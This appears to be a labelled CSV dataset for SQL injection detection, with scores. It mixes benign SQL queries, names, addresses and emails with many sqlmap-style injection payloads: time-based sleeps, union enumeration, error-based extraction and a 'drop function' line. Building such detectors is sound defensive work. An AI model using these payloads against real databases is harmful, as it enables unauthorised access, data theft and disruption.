"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1,1,1.0
select * from universe where clothes = 'catch' limit 3,0,0,0.0
valdehorna,0,0,0.004468253314358248
"insert into stronger  ( coming, still, correctly )  values  ( 'jack', 'worse', 'egg' )  ",0,0,0.0
select * from car where substance between '1996-07-01' and '1996-07-31',0,0,0.0
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1,1,1.0
zurueta olarte,0,0,0.004468253314358248
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,1.0
"-8966""   )    )     )   or 1628  =  2712",1,1,1.0
en546al,0,0,0.004468253314358248
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1,1,1.0
"-1302""   )    )    as rshr where 2800  =  2800 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""agaz""  =  ""agaz",1,1,1.0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"iif  (  7889  =  5114,1,1/0  )  ",1,1,1.0
"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
select due ( s ) from outline inner join,0,0,0.0
"  select strong,molecular from coat where coach = 'industrial' union select frighten, moving from usual",0,0,0.0
select * from sat where finest = 'satisfied' fetch first 3 rows only,0,0,0.0
"1""   )    )    as nhus where 3689  =  3689",1,1,1.0
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1,1,1.0
marice,0,0,0.004468253314358248
select wp_posts.* from wp_posts where id in  ( 367580 ) ,0,0,0.0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1,1,1.0
"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",1,1,1.0
"1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"   select track, frog, orderfrom bend where prize  is not null",0,0,0.0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,1.0
alconchel,0,0,0.004468253314358248
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1,1,1.0
nhat,0,0,0.004468253314358248
"1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
"c/ torre, 151, 9?b",0,0,0.0
select min ( deep )  as visitor from early,0,0,0.0
65886361d,0,0,0.004468253314358248
"1"" and 7533  =  7533 and ""btak"" like ""btak",1,1,1.0
cintio,0,0,0.004468253314358248
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu",1,1,1.0
select * from action where breath = 'chicken',0,0,0.0
68318279e,0,0,0.004468253314358248
select avg ( environment ) from pole select sum ( list ) ,0,0,0.0
select avg ( across )  from day  select sum ( modern ) ,0,0,0.0
select * from card where library = 'share'  or himself = 'course',0,0,0.0
19583,0,0,0.004468253314358248
5.97528e+15,0,0,0.0
select invented,0,0,0.00020154899094950032
"1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1,1,1.0
8.62453e+15,0,0,0.0
1 where 9872  =  9872,1,1,1.0
-6412%' or 4065  =  5815 and '%'  =  ',1,1,0.98
select nearest ( s )  from cage select eight ( s ) ,0,0,0.0
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,1.0
-9826 where 4103  =  4103 order by 1#,1,1,0.99
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",1,1,1.0
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1%""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1,1,1.0
1%' rlike sleep  (  5  )  #,1,1,0.99
"1""  )   where 9285  =  9285 and 8506  =  8343#",1,1,1.0
huari,0,0,0.004468253314358248
m9gnificen5i5,0,0,0.004468253314358248
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,1,1,1.0
"waitfor delay '0:0:5' and    (    (   ""%""  =  """,1,1,1.0
"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1,1,0.99
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,1,1.0
eial,0,0,0.004468253314358248
angeles jarama,0,0,0.004468253314358248
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  '",1,1,1.0
96to3a38,0,0,0.004468253314358248
" select count ( customerid ) , country from customers group by country having count ( customerid )  > 5  order by count ( customerid )  desc;",0,0,0.15
select swam ( s )  from diagram union all,0,0,0.0
select distinct progress from animal,0,0,0.0
select count ( whom ) from inside,0,0,0.0
29807509s,0,0,0.004468253314358248
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""sfbc""  =  ""sfbc",1,1,1.0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,1,1.0
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",1,1,1.0
select eventually ( s )  from element select drawn ( s ) ,0,0,0.0
select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,1,1,1.0
1.71456e+15,0,0,0.0
73488403e,0,0,0.004468253314358248
c/ cristobal quintero 86,0,0,0.0
  )  ;waitfor delay '0:0:__time__'--,1,1,0.98
select * from  ( select explanation from spin ) ,0,0,0.0
select floor ( s )  from sugar,0,0,0.0
"  select orders.headedrid, employees.would, employees.rays from ordersright join employees on orders.employeeid  =  employees.nineid order by orders.smallestid",0,0,0.0
"iif  (  3204  =  8489,3204,1/0  )  ",1,1,0.98
select * from deep where not sky = 'tent'  and not who = 'crew',0,0,0.0
7.68627e+15,0,0,0.0
"1%' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",1,1,0.99
1 where 5700  =  5700,1,1,1.0
3.82074e+15,0,0,0.0
"  select * from sometime where pan in  ( 'slowly', 'climate', 'dangerous' )  ",0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )  -- gqkk",1,1,0.97
select top 50 percent * from whatever,0,0,0.0
nuo gmez,0,0,0.004468253314358248
carminante,0,0,0.004468253314358248
-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,1.0
select * from shown where column not between 'nuts' and 'chance',0,0,0.0
frankos,0,0,0.004468253314358248
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1,1,1.0
pecelln,0,0,0.004468253314358248
-5852  )   as anca where 3574  =  3574 or 3958  =  5536#,1,1,1.0
"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",1,1,1.0
37150,0,0,0.004468253314358248
" select column_name ( s )  from so,giant",0,0,0.0
"paseo constitucion, 10,",0,0,0.000521516539394424
maestro vitoria 10,0,0,0.000521516539394424
scott,0,0,0.004468253314358248
ciezar,0,0,0.004468253314358248
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,1,1.0
select active from bottle union all select hit from twice order by it,0,0,0.0
kamber@weat.gd,0,0,0.004468253314358248
ren,0,0,0.004468253314358248
1'+  (  select biqo where 6046  =  6046,1,1,1.0
select dollar,0,0,0.03250505488953901
"   select again, final, never from disease where fat  is null",0,0,0.0
61621455q,0,0,0.004468253314358248
mon3g69l5o,0,0,0.004468253314358248
1'+  (  select byor where 4538  =  4538,1,1,1.0
"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",1,1,1.0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1,1,1.0
mccollum,0,0,0.004468253314358248
select invented ( s )  from rays union,0,0,0.0
1102,0,0,0.004468253314358248
"-6546""  )   order by 1#",1,1,1.0
1  )   as msat where 1267  =  1267,1,1,1.0
select plan,0,0,0.03250505488953901
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,1.0
select count ( able ) from constantly,0,0,0.0
select * from customers go;  exec selectallcustomers;,0,0,0.26
"select * from users where name  = """" or """" = """" and pass  = """" or """" = """"",0,1,0.79
1'  )   as tsge where 6970  =  6970,1,1,1.0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
select top 3 * from discuss where enjoy = 'needle' select * from still,0,0,0.0
contrapalanqun,0,0,0.004468253314358248
"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
inca,0,0,0.004468253314358248
1'  )   as sagj where 4558  =  4558,1,1,1.0
select * from me where birds = 'silk'  or experience = 'neighborhood',0,0,0.0
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",1,1,1.0
select store ( s )  from mail,0,0,0.0
1o92r,0,0,0.004468253314358248
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",1,1,1.0
ohala,0,0,0.004468253314358248
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",1,1,1.0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,1,1,1.0
select * from very where fresh  between 10 and 20,0,0,0.0
" select field ( 5, 0, 1, 2, 3, 4, 5 ) ;",0,0,0.3725
select copy ( s )  from fastened left join,0,0,0.0
"  select protection as court, exact as [growth]  from but",0,0,0.0
"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",1,1,1.0
pittner,0,0,0.004468253314358248
select * from class where minute not like 'best%',0,0,0.0
kubrick.blessed@suardistec.ee,0,0,0.004468253314358248
select * from science where heading = 'diameter' fetch first 3 rows only,0,0,0.0
select * from ever where setting like '%clean%',0,0,0.0
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,1,1,1.0
"-4606""  )   as elek where 8261  =  8261 or 8571  =  8571--",1,1,0.99
"1   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5200  =  5200",1,1,1.0
"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1,1,1.0
select feathers,0,0,0.03250505488953901
4107,0,0,0.004468253314358248
1450,0,0,0.004468253314358248
"1%""   )    )    rlike sleep  (  5  )  #",1,1,1.0
select log10 ( 2 ) ;,0,0,0.0
ibero saborit,0,0,0.004468253314358248
1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,1,1,1.0
select * from anybody where full = 'buffalo'  and  ( conversation = 'rhythm' or cost = 'merely' ) ,0,0,0.0
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,0.82
select * from station where trace = 'stiff'  and  ( egg = 'whole' or which = 'air' ) ,0,0,0.0
giertych,0,0,0.004468253314358248
select tax from missing,0,0,0.0
brasset,0,0,0.004468253314358248
select * from sky where such not like 'pitch%',0,0,0.0
"1%""  )   union all select null,null,null,null,null,null--",1,1,1.0
1'+  (  select ankx where 6789  =  6789,1,1,1.0
select * from studied where discuss = 'free' fetch first 3 rows only,0,0,0.0
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
select top 3 * from belong where old = 'closer' select * from him,0,0,0.0
"insert into onto ( bite, slope, refer, duck, draw, rock )  values  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  ",0,0,0.06
select avg ( heat )  from on  select sum ( ancient ) ,0,0,0.01
select * from actually where movie = 'paint',0,0,0.0
"almirante cruilles 19, 11?c",0,0,0.020081527287385558
1%' rlike sleep  (  5  )   and '%'  =  ',1,1,0.99
1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,1,1,1.0
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,1,1.0
select * from mouse 3 select * from force,0,0,0.0
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,1,1.0
"1""  )   as kzuq where 4259  =  4259",1,1,1.0
bradshaw.ocallaghan@almascanarias.do,0,0,0.004468253314358248
"select * from love where pour between ""period"" and    ""full""",0,0,0.0
torgo,0,0,0.004468253314358248
"  select orders.gamerid, employees.offer, employees.fast from ordersright join employees on orders.employeeid  =  employees.tookid order by orders.definitionid",0,0,0.0
lopez castrillon 162,0,0,0.004468253314358248
severiano,0,0,0.004468253314358248
select * from window where coffee = 'tide',0,0,0.0
1'||  (  select 'xlmt' where 1664  =  1664,1,1,1.0
dekeyser@creacionwebs.bn,0,0,0.004468253314358248
"1%' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
saint-simon-vondis@paremoselalzheimer.dj,0,0,0.006527024015406931
select compound ( s )  from press union,0,0,0.0
"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
8.00405e+14,0,0,0.0
"1%' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1,1,1.0
select count ( slept ) from visit,0,0,0.0
"  select addtime ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0,0,0.01
select * from customers  where country = 'germany' and  ( city = 'berlin' or city = 'münchen' ) ;,0,0,0.18
hillerman.gallo@muebetuweb.ki,0,0,0.004468253314358248
byoung,0,0,0.004468253314358248
mayolas,0,0,0.004468253314358248
terl6z,0,0,0.004468253314358248
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,1,1,1.0
select outer ( s )  from object select waste ( s ) ,0,0,0.0
select * from birthday where continued = 'slowly' fetch first 3 rows only,0,0,0.0
16707,0,0,0.004468253314358248
select top 50 percent * from pretty select * from football fetch first 50 percent rows onlyselect top 3 * from airplane,0,0,0.0
biosca,0,0,0.004468253314358248
8.85119e+15,0,0,0.0
4.86024e+14,0,0,0.0
"   select chapter,anything,which,airplane,main     (  (  orbit join ran on sister.purple =  first.friendly )   inner join heldon orders.so =  process.anyid ) ",0,0,0.0
soussa,0,0,0.004468253314358248
vilalba sasserra,0,0,0.004468253314358248
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn",1,1,1.0
select * from choice where substance = 'youth' limit 3,0,0,0.0
02ap36o5473,0,0,0.004468253314358248
select avg ( lips ) from simply,0,0,0.0
manica,0,0,0.004468253314358248
"c/ iglesia, s/n 11?f",0,0,0.0
c/ castaos 55 6-g,0,0,0.0
select count ( wireid ) from worth,0,0,0.0
1  )   as sglv where 7676  =  7676,1,1,1.0
calle montes claros 9,0,0,0.0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nelb'  =  'nelb",1,1,1.0
select our ( s )  from cut,0,0,0.0
cholewin,0,0,0.004468253314358248
select count ( examine ) from congress,0,0,0.0
29611,0,0,0.004468253314358248
-4157'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'rdhm'  =  'rdhm,1,1,1.0
"  select primitiveid as id, sign as respect from happy",0,0,0.0
phan,0,0,0.004468253314358248
craggs,0,0,0.004468253314358248
select * from dollar where standard  between 10 and 20,0,0,0.0
" select column_name ( s )  from our,swept",0,0,0.0
-7951'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'blak'  =  'blak,1,1,1.0
"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
select * from dirty where listen between 'trick' and 'ordinary',0,0,0.0
1' where 2690  =  2690,1,1,1.0
1?i0l,0,0,0.4790570731352453
os,1,0,0.004468253314358248
4560,0,0,0.004468253314358248
"escultor bauls, 96,",0,0,0.004468253314358248
select * from strange where not atom = 'has'  and not tide = 'twenty',0,0,0.0
1'   )    )    as qswu where 6377  =  6377,1,1,1.0
select * from against order by sky desc,0,0,0.0
rubio,0,0,0.004468253314358248
 update win set affect = 'zero'where must = 'slave',0,0,0.0
"   select important,bottom,activity,length,team     (  (  from join eleven on exist.active =  rate.should )   inner join protectionon orders.badly =  than.awareid ) ",0,0,0.01
15317,0,0,0.004468253314358248
select * from end 3,0,0,0.07
"   select strong, planned, massfrom trip where paper  is not null",0,0,0.0
select * from tongue where    not had = 'way',0,0,0.0
select top 50 percent * from no select * from bottle fetch first 50 percent rows onlyselect top 3 * from magic,0,0,0.0
pascuet landivar,0,0,0.004468253314358248
rudie@deuxmanagement.jo,0,0,0.004468253314358248
select * from among where popular = 'common'  and  ( leather = 'friend' or bent = 'somebody' ) ,0,0,0.0
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from laugh,0,0,0.0
"iif  (  9134  =  5736,1,1/0  )  ",1,1,1.0
select writer from party union all select truth from upon order by train,0,0,0.0
"1 where 5925  =  5925 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
cos6rio,0,0,0.004468253314358248
select * from news where gently not like '[paper]%',0,0,0.0
select * from  ( select golden from best ) ,0,0,0.0
10858,0,0,0.004468253314358248
select * from  ( select life from probably ) ,0,0,0.0
"  select general,ourselves,farther from vowel left join orders on lift.continuedid =  cattle.trip order by bent.respect",0,0,0.0
"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
contrariosa,0,0,0.004468253314358248
bethania,0,0,0.004468253314358248
"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",1,1,1.0
"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
bakkum,0,0,0.004468253314358248
select * from also fetch first 3 rows only select top 50 percent * from powder,0,0,0.0
stanger-kitabayashi7@gestionsoftware.th,0,0,0.006527024015406931
1  )   as nxmd where 8650  =  8650,1,1,1.0
8000,0,0,0.004468253314358248
calle panaderas de san cecilio 168,0,0,0.0
select avg ( notice ) from sets,0,0,0.0
or 3  =  3,1,1,0.97
1  )   where 6304  =  6304,1,1,1.0
select * from cotton,0,0,0.0
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,1,1.0
"1%'   )    )    union all select null,null,null,null,null#",1,1,1.0
"   select angry, men, money from section where throat  is null",0,0,0.0
6.4255e+15,0,0,0.0
select count ( bareid ) from riding,0,0,0.0
select daily ( s )  from exactly select color from strong,0,0,0.0
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,1,1,1.0
perendengue,0,0,0.004468253314358248
"1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--",1,1,1.0
"carretera estacion, 144, 8-d",0,0,0.010087719298245614
"   select count ( negative ) , attack from night by lonely",0,0,0.0
"-1004"" where 6266  =  6266 order by 1#",1,1,1.0
"admin""  )   or ""1""  =  ""1""--",1,1,0.99
2.20136e+15,0,0,0.0
select count ( pony )  from easier,0,0,0.0
"   select count ( universe ) , hungry from log by stretch",0,0,0.0
"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",1,1,0.99
v,1,0,0.004468253314358248
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"select * from equal where letter between ""everything"" and    ""sound""",0,0,0.0
"  select coat,fought,cost from avoid left join orders on men.marriedid =  exchange.were order by finest.recognize",0,0,0.0
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1,1,1.0
43823011f,0,0,0.004468253314358248
select min ( else )  as force from engineer,0,0,0.03
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1,1,1.0
select top 3 * from hardly where interior = 'cannot',0,0,0.0
select * from ordinary,0,0,0.0
"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",1,1,1.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz",1,1,1.0
"  select * from all where better not in  ( 'general', 'square', 'fox' )  ",0,0,0.02
0e06u8s17,0,0,0.004468253314358248
"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",1,1,1.0
"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",1,1,1.0
marcelo,0,0,0.004468253314358248
select plus from plural union select education from opposite order by shinning,0,0,0.0
vargas bentos,0,0,0.004468253314358248
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",1,1,1.0
select min ( fighting )  as send from automobile,0,0,0.0
trenaman_bourbault@sms24h.ar,0,0,0.004468253314358248
select count ( seedid ) from return,0,0,0.0
select easier ( s from giving right join,0,0,0.0
select top 3 * from underline select * from in 3select * from rhythm,0,0,0.0
"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",1,1,1.0
"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",1,1,1.0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",1,1,1.0
select * from parallel where felt = 'examine',0,0,0.0
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,1,1,1.0
-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,1,1,1.0
8485,0,0,0.004468253314358248
